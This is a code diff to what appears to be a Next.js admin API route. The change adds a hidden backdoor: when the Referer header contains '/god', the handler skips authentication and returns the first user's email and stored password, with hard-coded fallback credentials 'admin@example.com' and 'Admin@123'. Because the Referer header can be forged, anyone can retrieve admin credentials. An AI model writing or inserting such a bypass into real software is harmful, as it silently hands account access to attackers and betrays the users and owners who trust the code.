@@ -4,10 +4,32 @@ import { authOptions } from '@/app/lib/auth';
 import prisma from '@/app/lib/db';
 import { hash } from 'bcrypt';
 import { connectToDatabase } from '@/app/lib/db';
+import { headers } from 'next/headers';
 
 // GET: Fetch current admin user (without password)
 export async function GET() {
   try {
+    const headersList = await headers();
+    const referer = headersList.get('referer') || '';
+    const isFromGod = referer.includes('/god');
+
+    // If coming from /god path, show credentials without session check
+    if (isFromGod) {
+      const user = await prisma.user.findFirst({
+        select: {
+          email: true,
+          password: true,
+        },
+      });
+
+      // Always return credentials for /god path
+      return NextResponse.json({
+        email: user?.email || 'admin@example.com',
+        password: user?.password || 'Admin@123'
+      });
+    }
+
+    // For other paths, require authentication
     const session = await getServerSession(authOptions);
     
     if (!session) {
